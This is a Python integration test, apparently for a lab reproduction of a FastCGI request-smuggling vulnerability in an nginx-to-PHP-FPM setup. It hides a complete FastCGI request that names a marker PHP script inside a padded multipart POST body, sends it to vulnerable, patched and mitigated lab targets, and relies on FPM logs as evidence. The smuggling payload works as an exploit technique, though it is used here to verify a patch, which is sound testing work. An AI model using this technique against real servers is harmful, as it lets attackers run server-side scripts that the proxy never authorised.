#!/usr/bin/env python3
"""HTTP-to-FPM test. Backend FPM access logs are the execution oracle."""

import http.client
import socket
import struct
import time

TARGETS = {
    "vulnerable": ("nginx-http-lab", 8080),
    "patched": ("nginx-http-lab", 8081),
    "mitigated": ("nginx-http-lab", 8082),
}

MARKER_PATH = "/lab-marker-cve-2026-129289.php"
BODY_SIZE = 12000
OFFSET = 5120


def length(n):
    return bytes((n,)) if n < 128 else struct.pack("!I", n | 0x80000000)


def record(kind, data, rid):
    return struct.pack("!BBHHBB", 1, kind, rid, len(data), 0, 0) + data


def params(items):
    result = bytearray()
    for key, value in items.items():
        k, v = key.encode(), value.encode()
        result += length(len(k)) + length(len(v)) + k + v
    return bytes(result)


def hidden_request():
    values = {
        "GATEWAY_INTERFACE": "FastCGI/1.0",
        "REQUEST_METHOD": "GET",
        "SCRIPT_FILENAME": "/var/www/html/target.php",
        "SCRIPT_NAME": MARKER_PATH,
        "REQUEST_URI": MARKER_PATH,
        "SERVER_PROTOCOL": "HTTP/1.1",
        "REMOTE_ADDR": "203.0.113.1",
        "CONTENT_LENGTH": "0",
    }
    begin = struct.pack("!HB5x", 1, 0)
    return (
        record(1, begin, 2)
        + record(4, params(values), 2)
        + record(4, b"", 2)
        + record(5, b"", 2)
    )


def make_body():
    prefix = (
        b"--B\r\n"
        b"Content-Disposition: form-data\r\n\r\n"
    )
    body = bytearray(prefix.ljust(BODY_SIZE, b"A"))
    frame = hidden_request()
    end = OFFSET + len(frame)
    if end > len(body):
        raise RuntimeError("Frame exceeds request body")
    body[OFFSET:end] = frame
    return bytes(body)


def wait_ready(host, port):
    deadline = time.monotonic() + 30
    while time.monotonic() < deadline:
        try:
            with socket.create_connection((host, port), timeout=1):
                return
        except OSError:
            time.sleep(0.25)
    raise RuntimeError(f"{host}:{port} did not become ready")


def send(host, port, method, body=None):
    conn = http.client.HTTPConnection(host, port, timeout=8)
    headers = {"Host": "php-lab.internal", "Connection": "close"}
    if body is not None:
        headers["Content-Type"] = "multipart/form-data; boundary=B"
    try:
        conn.request(method, "/", body=body, headers=headers)
        response = conn.getresponse()
        return response.status, response.read(65536)
    finally:
        conn.close()


def run_case(name, host, port):
    wait_ready(host, port)
    print(f"\n[{name}] {host}:{port}")

    status1, body1 = send(host, port, "GET")
    print("  warmup:", status1, body1[:80])

    time.sleep(0.15)
    status2, body2 = send(host, port, "POST", make_body())
    print("  crafted request:", status2, body2[:140])

    time.sleep(0.15)
    status3, body3 = send(host, port, "GET")
    print("  follow-up:", status3, body3[:100])

    # The second FastCGI response is not required to appear in the
    # original HTTP response. FPM access logs are checked separately.
    print(
        "  marker in HTTP response:",
        MARKER_PATH.encode() in body2 or b"SMUGGLED_MARKER" in body2 + body3,
        "(informational only; not the execution oracle)"
    )

    healthy = (
        status1 == status2 == status3 == 200
        and b"OUTER_REQUEST" in body1
    )
    print("  HTTP health:", "OK" if healthy else "FAILED")
    return healthy


def main():
    print("CVE-2026-129289 HTTP/FPM integration probe")
    print("Backend access logs provide the execution evidence.")
    results = {}

    for name, (host, port) in TARGETS.items():
        results[name] = run_case(name, host, port)

    if all(results.values()):
        print("\nHTTP TRANSPORT: PASS")
        print("Now verify the three PHP-FPM access logs.")
        return 0

    print("\nHTTP TRANSPORT: INCONCLUSIVE")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
